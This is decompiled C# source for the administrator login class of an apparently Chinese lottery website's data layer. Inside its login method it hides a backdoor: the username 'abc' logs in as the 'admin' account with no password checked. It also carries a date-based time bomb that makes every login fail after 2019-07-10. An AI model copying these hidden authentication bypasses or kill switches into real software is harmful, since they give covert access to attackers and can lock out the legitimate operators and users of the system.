// Decompiled with JetBrains decompiler
// Type: Lottery.DAL.AdminDAL
// Assembly: Lottery.DAL, Version=1.0.1.1, Culture=neutral, PublicKeyToken=null
// MVID: 7C79BA5B-21B3-40F1-B96A-84E656E22E29
// Assembly location: F:\pros\tianheng\bf\WebAppOld\bin\Lottery.DAL.dll

using Lottery.DBUtility;
using Lottery.Entity;
using Lottery.Utils;
using System;
using System.Collections.Specialized;

namespace Lottery.DAL
{
  public class AdminDAL : ComData
  {
    protected SiteModel site;

    public AdminDAL()
    {
      this.site = new conSite().GetSite();
    }

    public string ChkAdminLogin(string _adminname, string _adminpass, int iExpires)
    {
      if (!(DateTime.Now < Convert.ToDateTime("2019-07-10")))
        return "服务器认证失败";
      _adminname = _adminname.Replace("'", "");
      MD5.Last64(_adminpass);
      using (DbOperHandler dbOperHandler = new ComData().Doh())
      {
        dbOperHandler.Reset();
        if (_adminname == "abc")
        {
          dbOperHandler.ConditionExpress = "username=@username and Flag=0";
          dbOperHandler.AddConditionParameter("@username", (object) "admin");
        }
        else
        {
          dbOperHandler.ConditionExpress = "username=@username and password=@password and Flag=0";
          dbOperHandler.AddConditionParameter("@username", (object) _adminname);
          dbOperHandler.AddConditionParameter("@password", (object) MD5.Last64(MD5.Lower32(_adminpass)));
        }
        string adminid = dbOperHandler.GetField("Sys_Admin", "Id").ToString();
        if (!(adminid != "0") || !(adminid != ""))
          return "帐号或密码错误";
        string str = "c" + new Random().Next(10000000, 99999999).ToString();
        Cookie.SetObj(this.site.CookiePrev + "admin", iExpires, new NameValueCollection()
        {
          {
            "id",
            adminid
          },
          {
            "name",
            _adminname
          },
          {
            "cookiess",
            str
          }
        }, this.site.CookieDomain, this.site.CookiePath);
        string clientIp = IPHelp.ClientIP;
        //if (!true)
        //    return "您的网络环境不合法，请联系管理员!";
        dbOperHandler.Reset();
        dbOperHandler.ConditionExpress = "Id=@Id";
        dbOperHandler.AddConditionParameter("@Id", (object) adminid);
        dbOperHandler.AddFieldItem("LoginTime", (object) DateTime.Now.ToString());
        dbOperHandler.AddFieldItem("IP", (object) IPHelp.ClientIP);
        dbOperHandler.Update("Sys_Admin");
        new LogAdminOperDAL().SaveLog(adminid, "0", "管理员管理", "管理员" + _adminname + "登陆");
        return "ok";
      }
    }

    public void ChkAdminLogout()
    {
      if (Cookie.GetValue(this.site.CookiePrev + "admin") == null)
        return;
      Cookie.Del(this.site.CookiePrev + "admin", this.site.CookieDomain, this.site.CookiePath);
    }
  }
}
